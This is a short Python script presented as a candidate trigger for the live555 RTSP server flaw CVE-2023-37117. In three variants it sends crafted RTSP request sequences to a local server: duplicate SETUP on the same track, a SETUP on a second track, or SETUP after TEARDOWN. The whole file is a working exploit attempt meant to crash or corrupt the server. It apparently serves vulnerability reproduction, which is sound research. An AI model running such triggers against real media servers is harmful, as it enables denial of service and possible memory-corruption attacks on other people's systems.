#!/usr/bin/env python3
"""live555 CVE-2023-37117 candidate trigger: duplicate SETUP on same track.

Variants (argv[1]):
  1 = DESCRIBE + SETUP track1 + SETUP track1 again (same conn)
  2 = variant 1 on matroskaFileTest
  3 = DESCRIBE + SETUP + TEARDOWN + SETUP (session reuse)
"""
import socket, sys, time

variant = sys.argv[1] if len(sys.argv) > 1 else "2"

def req(method, url, cseq, extra=None):
    m = f"{method} rtsp://127.0.0.1:8554/{url} RTSP/1.0\r\nCSeq: {cseq}\r\n"
    if extra:
        m += extra + "\r\n"
    return (m + "\r\n").encode()

s = socket.create_connection(("127.0.0.1", 8554), timeout=10)

def send_and_recv(data, label):
    s.sendall(data)
    time.sleep(0.3)
    try:
        r = s.recv(65535)
        print(f"[{label}] -> {r[:100]!r}")
        return r
    except Exception as e:
        print(f"[{label}] ERR {e}")
        return b""

send_and_recv(req("OPTIONS", "*", 1), "OPTIONS")

if variant in ("1", "2"):
    stream = "matroskaFileTest" if variant == "2" else "mpgVideoTest"
    send_and_recv(req("DESCRIBE", stream, 2, "Accept: application/sdp"), "DESCRIBE")
    tr = "Transport: RTP/AVP;unicast;client_port=40000-40001"
    send_and_recv(req("SETUP", f"{stream}/track1", 3, tr), "SETUP#1")
    send_and_recv(req("SETUP", f"{stream}/track1", 4, tr), "SETUP#2(same-track)")
    send_and_recv(req("SETUP", f"{stream}/track2", 5, tr), "SETUP#3(track2)")
elif variant == "3":
    stream = "matroskaFileTest"
    send_and_recv(req("DESCRIBE", stream, 2, "Accept: application/sdp"), "DESCRIBE")
    tr = "Transport: RTP/AVP;unicast;client_port=40000-40001"
    r = send_and_recv(req("SETUP", f"{stream}/track1", 3, tr), "SETUP")
    sess = None
    for line in r.decode(errors="replace").splitlines():
        if line.lower().startswith("session:"):
            sess = line.split(":", 1)[1].strip()
    hdr = f"Transport: RTP/AVP;unicast;client_port=40000-40001" + (f"\r\nSession: {sess}" if sess else "")
    send_and_recv(req("TEARDOWN", f"{stream}/track1", 4, hdr), "TEARDOWN")
    send_and_recv(req("SETUP", f"{stream}/track1", 5, tr), "SETUP-after-TEARDOWN")

s.close()
